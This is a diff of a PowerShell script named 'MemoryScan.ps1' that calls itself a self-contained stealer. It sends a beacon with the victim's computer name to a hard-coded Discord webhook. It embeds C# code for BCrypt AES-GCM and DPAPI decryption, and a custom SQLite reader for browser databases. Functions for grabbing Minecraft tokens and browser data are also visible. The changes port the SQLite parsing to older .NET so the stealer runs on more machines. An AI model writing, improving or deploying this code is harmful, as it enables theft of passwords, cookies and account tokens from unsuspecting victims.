@@ -1,4 +1,4 @@
-# MemoryScan.ps1 – Self-Contained Stealer (Built‑in SQLite + BCrypt + DPAPI)
+# MemoryScan.ps1 – Fully Self‑Contained Stealer (No Tuples, No External Tools)
 param(
     [string]$Webhook = "https://discord.com/api/webhooks/1518911878712004730/ejFY2gDI9Secx7kXsEgIIbpEWsBm5m9Ho_Q5R8gF4tP0lO7-R3VBA068PJdRk63jSaBa"
 )
@@ -10,7 +10,7 @@ try {
     Invoke-RestMethod -Uri $Webhook -Method Post -Body (@{content="🟢 MemoryScan on $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json"
 } catch {}
 
-# ---------- 2. C# BCrypt AES‑GCM (compile once) ----------
+# ---------- 2. BCrypt AES‑GCM (compile once) ----------
 if (-not ([System.Management.Automation.PSTypeName]'AESGCM').Type) {
     Add-Type @"
 using System;
@@ -56,7 +56,7 @@ public static class AESGCM {
 "@ -ErrorAction Stop
 }
 
-# ---------- 3. C# SQLite Reader (fully working) ----------
+# ---------- 3. C# SQLite Reader (No tuples, .NET 4.x compatible) ----------
 if (-not ([System.Management.Automation.PSTypeName]'SQLiteReader').Type) {
     Add-Type @"
 using System;
@@ -76,22 +76,20 @@ public class SQLiteReader {
     }
 
     public List<Dictionary<string, byte[]>> ReadTable(string table, string[] columns) {
-        // 1) Find table root page from sqlite_master
         int rootPage = 0;
         string createSql = null;
-        var masterRows = ReadPage(1, 1); // page 1 is sqlite_master
+        var masterRows = ReadPage(1);
         foreach (var row in masterRows) {
             string tblType = Encoding.UTF8.GetString(row[0]).TrimEnd('\0');
             string tblName = Encoding.UTF8.GetString(row[1]).TrimEnd('\0');
             if (tblType == "table" && tblName == table) {
                 createSql = Encoding.UTF8.GetString(row[4]).TrimEnd('\0');
-                rootPage = BitConverter.ToInt32(row[3], 0); // column 3 is rootpage (integer)
+                rootPage = BitConverter.ToInt32(row[3], 0);
                 break;
             }
         }
         if (rootPage == 0) return new List<Dictionary<string, byte[]>>();
 
-        // 2) Map column names to indices from CREATE TABLE sql
         var colOrder = new Dictionary<string, int>();
         var regex = new System.Text.RegularExpressions.Regex(@"""?(\w+)""?\s+(?:INTEGER|TEXT|BLOB|REAL|NUMERIC)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
         var matches = regex.Matches(createSql);
@@ -100,15 +98,14 @@ public class SQLiteReader {
             colOrder[m.Groups[1].Value] = idx++;
         }
         Dictionary<int, int> colMapping = new Dictionary<int, int>();
-        foreach (string c in columns) {
-            if (colOrder.ContainsKey(c))
-                colMapping[Array.IndexOf(columns, c)] = colOrder[c];
+        for (int i = 0; i < columns.Length; i++) {
+            if (colOrder.ContainsKey(columns[i]))
+                colMapping[i] = colOrder[columns[i]];
             else
-                return new List<Dictionary<string, byte[]>>(); // column missing
+                return new List<Dictionary<string, byte[]>>();
         }
 
-        // 3) Read all rows from the table b‑tree
-        List<byte[][]> rawRows = ReadPage(rootPage, 1);
+        List<byte[][]> rawRows = ReadPage(rootPage);
         List<Dictionary<string, byte[]>> result = new List<Dictionary<string, byte[]>>();
         foreach (byte[][] rawRow in rawRows) {
             var dict = new Dictionary<string, byte[]>();
@@ -123,12 +120,11 @@ public class SQLiteReader {
         return result;
     }
 
-    // Recursively reads a b‑tree page, returns list of rows (array of column byte arrays)
-    private List<byte[][]> ReadPage(int pageNum, int level) {
+    private List<byte[][]> ReadPage(int pageNum) {
         List<byte[][]> rows = new List<byte[][]>();
         int offset = (pageNum - 1) * pageSize;
         byte pageType = db[offset];
-        if (pageType == 0x0D) { // leaf table page
+        if (pageType == 0x0D) {
             int numCells = (db[offset+3] << 8) | db[offset+4];
             for (int i = 0; i < numCells; i++) {
                 int cellOff = (db[offset+8 + i*2] << 8) | db[offset+9 + i*2];
@@ -137,73 +133,68 @@ public class SQLiteReader {
                 byte[][] row = ParseCell(cell);
                 rows.Add(row);
             }
-        } else if (pageType == 0x05) { // interior table page
+        } else if (pageType == 0x05) {
             int numCells = (db[offset+3] << 8) | db[offset+4];
             int rightMostPointer = (db[offset+8] << 24) | (db[offset+9] << 16) | (db[offset+10] << 8) | db[offset+11];
             for (int i = 0; i < numCells; i++) {
                 int cellOff = (db[offset+12 + i*2] << 8) | db[offset+13 + i*2];
                 int childPage = (db[offset+cellOff] << 24) | (db[offset+cellOff+1] << 16) | (db[offset+cellOff+2] << 8) | db[offset+cellOff+3];
-                rows.AddRange(ReadPage(childPage, level+1));
+                rows.AddRange(ReadPage(childPage));
             }
-            rows.AddRange(ReadPage(rightMostPointer, level+1));
+            rows.AddRange(ReadPage(rightMostPointer));
         }
         return rows;
     }
 
-    // Parse a single cell into array of column bytes
     private byte[][] ParseCell(byte[] cell) {
-        // Read payload size varint
-        long payloadSize;
         int pos = 0;
-        (payloadSize, pos) = ReadVarint(cell, pos);
-        // skip rowid varint
-        (_, pos) = ReadVarint(cell, pos);
+        long payloadSize;
+        int varintLen;
+        ReadVarint(cell, pos, out payloadSize, out varintLen);
+        pos += varintLen;
+
+        long rowid;
+        ReadVarint(cell, pos, out rowid, out varintLen);
+        pos += varintLen;
 
         byte[] payload = new byte[payloadSize];
         Array.Copy(cell, pos, payload, 0, (int)payloadSize);
         pos = 0;
 
-        // Header size varint
         long headerSize;
-        (headerSize, pos) = ReadVarint(payload, pos);
-        int payloadStart = pos;
+        ReadVarint(payload, pos, out headerSize, out varintLen);
+        pos += varintLen;
 
-        // Serial types
         List<long> serialTypes = new List<long>();
-        for (int i = 0; i < headerSize - 1; i++) {
+        int headerEnd = (int)headerSize;
+        while (pos < headerEnd) {
             long st;
-            int len;
-            (st, len) = ReadVarint(payload, pos);
+            ReadVarint(payload, pos, out st, out varintLen);
             serialTypes.Add(st);
-            pos += len;
+            pos += varintLen;
         }
 
-        // Read column values
         byte[][] columns = new byte[serialTypes.Count][];
-        int dataOffset = payloadStart + (int)(headerSize - 1); // rough: after all serial types; need to account varint lengths, but easier: start after header bytes
-        // Actually the header size is the number of bytes including the varint itself, but after the header size varint, the next (headerSize-1) bytes are the serial type varints.
-        // So the real data starts at offset (1 + headerSize-1) = headerSize bytes from start of payload? Not exactly, because the header size varint is 1‑9 bytes. However, we know the total header size value is the number of bytes *including* the header size varint? The SQLite doc says: "the header size varint gives the size of the header in bytes, including the size varint itself." So after reading headerSize, we skip to pos = headerSize. That's correct: we read the varint at pos=0, then pos points to first byte after the header size varint. Then we need to advance to the end of header, which is headerSize bytes from the start of payload.
-        int dataStart = (int)headerSize;
-        pos = dataStart;
+        int dataPos = headerEnd;
         for (int i = 0; i < serialTypes.Count; i++) {
             int colSize = SizeOfSerialType(serialTypes[i]);
-            if (pos + colSize > payload.Length) break;
+            if (dataPos + colSize > payload.Length) break;
             columns[i] = new byte[colSize];
-            Array.Copy(payload, pos, columns[i], 0, colSize);
-            pos += colSize;
+            Array.Copy(payload, dataPos, columns[i], 0, colSize);
+            dataPos += colSize;
         }
         return columns;
     }
 
-    private (long, int) ReadVarint(byte[] data, int start) {
-        long val = 0;
-        int i;
-        for (i = 0; i < 9; i++) {
+    private void ReadVarint(byte[] data, int start, out long value, out int length) {
+        value = 0;
+        length = 0;
+        for (int i = 0; i < 9; i++) {
             byte b = data[start + i];
-            val = (val << 7) | (uint)(b & 0x7F);
+            value = (value << 7) | (uint)(b & 0x7F);
+            length++;
             if ((b & 0x80) == 0) break;
         }
-        return (val, i + 1);
     }
 
     private int SizeOfSerialType(long serialType) {
@@ -273,7 +264,7 @@ function Get-MinecraftTokens {
     return $mc
 }
 
-# ---------- 7. Browser data (uses SQLite reader) ----------
+# ---------- 7. Browser data ----------
 function Get-BrowserData {
     $result = @()
     $browsers = @(
